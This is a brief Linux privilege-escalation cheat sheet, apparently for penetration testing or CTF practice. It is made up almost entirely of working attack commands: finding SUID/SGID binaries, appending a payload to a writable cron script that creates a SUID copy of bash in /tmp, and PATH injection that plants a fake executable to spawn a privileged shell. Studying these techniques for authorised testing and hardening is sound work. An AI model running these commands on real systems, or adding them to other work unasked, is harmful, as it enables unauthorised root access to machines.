🔑 SUID/SGID Binaries

Find SUID Binaries

# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# With details
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

Exploit Writable Cron Script

# If cron runs a script you can write to:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Wait for cron, then:
/tmp/bash -p

PATH Injection

# If cron uses relative path:
echo '/bin/bash -p' > /tmp/scriptname
chmod +x /tmp/scriptname
export PATH=/tmp:$PATH
